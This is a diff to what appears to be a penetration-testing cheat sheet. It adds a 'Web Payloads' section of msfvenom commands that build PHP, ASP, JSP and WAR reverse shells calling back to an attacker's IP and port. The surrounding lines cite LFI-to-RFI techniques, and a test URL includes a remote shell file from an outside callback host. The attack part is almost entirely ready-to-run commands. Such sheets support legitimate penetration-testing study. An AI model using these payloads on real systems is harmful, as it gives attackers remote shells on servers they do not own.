@@ -143,6 +143,25 @@ Log Poisoning
 Turning LFI to RFI: https://l.avala.mp/?p=241
 [Reference](https://sushant747.gitbooks.io/total-oscp-guide/content/remote_file_inclusion.html)  
 
+## Web Payloads 
+
+PHP
+
+    msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
+    cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
+
+ASP
+
+    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp
+
+JSP
+
+    msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp
+
+WAR
+
+    msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
+
 ### Testing 
 
     http://example.com/index.php?page=http://callback.com/shell.txt
